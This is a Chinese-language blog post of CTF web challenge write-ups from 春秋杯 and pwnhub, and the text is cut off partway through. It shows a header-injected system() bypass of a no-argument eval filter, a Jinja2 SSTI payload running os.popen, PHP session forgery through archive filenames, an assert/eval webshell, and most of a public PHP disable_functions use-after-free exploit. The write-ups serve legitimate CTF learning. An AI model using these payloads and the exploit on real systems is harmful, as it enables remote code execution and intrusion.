<h1 id="春秋杯2022-5季赛"><a href="#春秋杯2022-5季赛" class="headerlink" title="春秋杯2022.5季赛"></a>春秋杯2022.5季赛</h1><h2 id="Mercy-code"><a href="#Mercy-code" class="headerlink" title="Mercy-code"></a>Mercy-code</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>et拦了get系列，还有一堆阿巴阿巴</p>
<p>找到文章：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA3ODAjdG9jLTI=">无参数命令执行学习</span></p>
<blockquote>
<p>die(array_shift(apache_request_headers()));</p>
</blockquote>
<p>apache_request_headers()在Apache环境下可用，获取全部的请求头</p>
<p>array被过滤了，然后各种操作都没能返回可控点，然后想获取apache_request_headers函数返回的全部内容，但var_dump之类的都不能用，最后从rossweisse师傅得到提示json_code，使用该函数可将数组转成json字符串，确实获取了请求头全部信息，但数组头尾都是不可空的，中间位置又无法获取到，直接使用这段json字符串进行命令执行，但json_encode返回的字符串是带有双引号的，命令无法逃逸出来：</p>
<blockquote>
<p>{“Host”:”eci-2ze1unm8inljptrkfbxt.cloudeci1.ichunqiu.com”,”X-Real-IP”:”111.47.226.120”,”X-Forwarded-For”:”117.136.89.107, 111.47.226.120, 111.47.226.120”,”Connection”:”close”,”Content-Length”:”47”,”RemoteIp”:”111.47.226.120”,”X-Connecting-IP”:”117.136.89.107”,”Real-Remote-Addr”:”117.136.89.107”,”X-Real-Forwarded-For”:”117.136.89.107”,”muhua”:”|ls||”,”Content-Type”:”application/x-www-form-urlencoded”,”X-From”:”JSL”,”X-JSL-Scheme”:”http”,”X-JSL-Port”:”80”}</p>
</blockquote>
<p>最后想到addslashes函数，可以将双引号转义掉，并且未被过滤，成功绕过。</p>
<p>发包：</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="operator">/</span> HTTP<span class="operator">/</span><span class="number">1.1</span></span><br><span class="line">Content<span class="operator">-</span>Length<span class="operator">:</span> <span class="number">62</span></span><br><span class="line">Host<span class="operator">:</span> eci<span class="operator">-</span><span class="number">2</span>ze1unm8inljptrkfbxt.cloudeci1.ichunqiu.com</span><br><span class="line">muhua<span class="operator">:</span> <span class="operator">|</span>ls<span class="operator">||</span></span><br><span class="line">Content<span class="operator">-</span>Type<span class="operator">:</span> application<span class="operator">/</span>x<span class="operator">-</span>www<span class="operator">-</span>form<span class="operator">-</span>urlencoded</span><br><span class="line"></span><br><span class="line">cmd<span class="operator">=</span>system<span class="punctuation">(</span>addslashes<span class="punctuation">(</span>json_encode<span class="punctuation">(</span>apache_request_headers<span class="punctuation">(</span><span class="punctuation">)</span><span class="punctuation">)</span><span class="punctuation">)</span><span class="punctuation">)</span>;</span><br></pre></td></tr></table></figure>

<p>成功读取到目录，成功任意命令执行，flag文件在当前目录，直接执行<code>cat *</code>即可</p>
<!-- ## picture convert -->

<h1 id="pwnhub"><a href="#pwnhub" class="headerlink" title="pwnhub"></a>pwnhub</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="TemplatePlay"><a href="#TemplatePlay" class="headerlink" title="TemplatePlay"></a>TemplatePlay</h3><p>f12唤出开发者工具，看到源代码处有一个js代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (navigator.<span class="property">userAgent</span>=<span class="string">&quot;Admin/5.0&quot;</span>)&#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://&quot;</span>+<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>+<span class="string">&quot;/view_template?string=1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>要求UA为Admin&#x2F;5.0，抓包改一下，然后照着他的格式访问<code>/view_template</code>并传参string，测试发现是ssti模板注入并且是jinja2的</p>
<p>简单测试发现waf，多测试几下，发现以下payload能绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.40.89.206:5001/view_template?string=&#123;&#123;g.pop.__globals__.__builtins__[%27__import__%27](%27os%27).popen(%27ls%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>使用命令找一找</p>
<blockquote>
<p>find &#x2F; -name <em>f</em><br>找到flag：<br>&#x2F;www&#x2F;config&#x2F;flag.txt</p>
</blockquote>
<p>读取即可</p>
<!-- flag{833ebf704d6221bf0566bf99248dc701} -->

<p>(这波是hackbar真好用，这题还用到了插件User-Agent Switcher and Manager来修改UA，都是chorme的)</p>
<h3 id="MyNotes"><a href="#MyNotes" class="headerlink" title="MyNotes"></a>MyNotes</h3><p>有附件，直接下载一个，然后本地审审跑跑测测</p>
<p>在<code>flag.php</code>里的代码要求<code>$SESSION</code>里有bool值为true的admin变量，但没有任何地方能创建这个变量</p>
<p>首先需要的知识是，题目是用session来记录的，通过这个记录的变量<code>$SESSION</code>值是和cookie里的PHPSESSID的值有关，并且<code>$SESSION</code>会被序列化并写入sess文件，文件名是<code>sess_</code>加上<code>PHPSESSID</code>的值，而序列化格式默认为，<code>a|s:1:&quot;1&quot;;</code></p>
<p>接着看到<code>export.php</code>的源码中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$notes</span> = <span class="title function_ invoke__">get_notes</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$type</span> = <span class="string">&#x27;zip&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$type</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">get_user</span>() . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$type</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$filename</span>); <span class="comment">// avoid path traversal</span></span><br><span class="line"><span class="variable">$path</span> = TEMP_DIR . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$type</span> === <span class="string">&#x27;tar&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">PharData</span>(<span class="variable">$path</span>);</span><br><span class="line">  <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// use zip as default</span></span><br><span class="line">  <span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">  <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span>, <span class="title class_">ZIPARCHIVE</span>::CREATE | <span class="title class_">ZipArchive</span>::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$index</span> = <span class="number">0</span>; <span class="variable">$index</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$notes</span>); <span class="variable">$index</span>++) &#123;</span><br><span class="line">  <span class="variable">$note</span> = <span class="variable">$notes</span>[<span class="variable">$index</span>];</span><br><span class="line">  <span class="variable">$title</span> = <span class="variable">$note</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">  <span class="variable">$title</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^!-~]/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="variable">$title</span>);</span><br><span class="line">  <span class="variable">$title</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="variable">$title</span>); <span class="comment">// delete suspicious characters</span></span><br><span class="line">  <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;<span class="subst">&#123;$index&#125;</span>_<span class="subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$note</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$type</span> === <span class="string">&#x27;tar&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>note的title是可控的，filename可控，type传入<code>.</code>即可使得末尾拼接的点被替空，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">get_user</span>() . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>)) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$type</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>

<p>filename为用户名的值，注册 <code>sess_</code> 登入</p>
<p>写入note，title如下<br><code>|s:1:&quot;a&quot;;user|s:5:&quot;muhua&quot;;admin|b:1;</code></p>
<p>这样经过export的处理之后得到的文件就是一个压缩包格式的文件，但文件名是session格式，由于session的反序列化解析，第一个 <code>|</code> 前面的一大串包括不可见字符的字符串会被作为第一个变量名，而admin变量之后的字符串在 <code>|</code> 之前，又会被解析为一个变量，而再之后的与前面的变量重名，不影响，在 <code>;</code> 之后的由于格式问题不会再被作为变量解析，那么经过这样解析，admin就被作为一个bool值为 <code>true</code> 的存在了</p>
<p>访问:<br><code>/export.php?type=.</code></p>
<p>此时得到的文件会被下载，即可得到在目标文件夹下的文件名，于是PHPSESSID的值也得到了，直接带着得到的文件名作为PHPSESSID值的cookie访问<code>/?page=flag</code>即可</p>
<!-- 啥玩意儿啊 -->

<h1 id="pwnhub内部赛五月"><a href="#pwnhub内部赛五月" class="headerlink" title="pwnhub内部赛五月"></a>pwnhub内部赛五月</h1><h2 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h2><h3 id="MockingMail"><a href="#MockingMail" class="headerlink" title="MockingMail"></a>MockingMail</h3><p>有源码，审一下，文件上传限制太死（文件内容转义特殊字符，文件名限制后缀）</p>
<p><code>index.php</code>里有个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mail</span>-&gt;<span class="title function_ invoke__">validateAddress</span>(<span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>], <span class="variable">$patternselect</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAddress</span>(<span class="params"><span class="variable">$address</span>, <span class="variable">$patternselect</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="variable">$patternselect</span>) &#123;</span><br><span class="line">            <span class="variable">$patternselect</span> = <span class="built_in">static</span>::<span class="variable">$validator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$patternselect</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$patternselect</span>, <span class="variable">$address</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>看一下<code>info.php</code>里对函数的限制，assert和eval都能用，打一下组合拳：</p>
<blockquote>
<p>&#x2F;index.php?addr&#x3D;eval($_REQUEST[1])&amp;select&#x3D;assert<br>直接蚁剑连上去了，关键是命令函数还不能执行，</p>
</blockquote>
<p>蚁剑插件的bypass disablefunction传不上去，github上找了个脚本绕：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/mm0r1/exploits</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># PHP 7.0-8.0 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=54350</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-8.0 versions</span></span><br><span class="line"><span class="comment"># released as of 2021-10-06</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;muhua&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGING&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="number">0x20</span> : CHUNK_DATA_SIZE);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="number">0x70</span> : <span class="number">0x50</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="number">0x18</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMD&#x27;</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$groom</span>[] = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_register</span>(<span class="string">&#x27;pwn_filter&#x27;</span>, <span class="string">&#x27;Pwn&#x27;</span>);</span><br><span class="line">    <span class="variable">$fd</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fd</span>,<span class="string">&#x27;pwn_filter&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span> <span class="keyword">extends</span> <span class="title">php_user_filter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$abc</span>, <span class="variable">$abc_addr</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$helper</span>, <span class="variable">$helper_addr</span>, <span class="variable">$helper_off</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$uafp</span>, <span class="variable">$hfp</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$in</span>, <span class="variable">$out</span>, &amp;<span class="variable">$consumed</span>, <span class="variable">$closing</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$closing</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="title function_ invoke__">stream_bucket_make_writeable</span>(<span class="variable">$in</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filtername = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable language_">$this</span>-&gt;stream);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">go</span>();</span><br><span class="line">        <span class="keyword">return</span> PSFS_PASS_ON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = &amp;<span class="variable language_">$this</span>-&gt;filtername;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">make_uaf_obj</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper = <span class="keyword">new</span> Helper;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper-&gt;b = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper_addr = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="number">2</span> - <span class="number">0x18</span>) - CHUNK_SIZE * <span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper @ 0x%x&quot;</span>, <span class="variable language_">$this</span>-&gt;helper_addr);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc_addr = <span class="variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;abc @ 0x%x&quot;</span>, <span class="variable language_">$this</span>-&gt;abc_addr);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;helper_off = <span class="variable language_">$this</span>-&gt;helper_addr - <span class="variable language_">$this</span>-&gt;abc_addr - <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$helper_handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="variable">$helper_handlers</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_leaker</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$helper_handlers</span> + <span class="number">8</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;binary leak @ 0x%x&quot;</span>, <span class="variable">$binary_leak</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_cleanup</span>(<span class="variable">$binary_leak</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable language_">$this</span>-&gt;helper_off + <span class="number">0x38</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;real closure @ 0x%x&quot;</span>, <span class="variable">$closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_ce</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="variable">$closure_ce</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$closure_ce</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="variable">$basic_funcs</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ 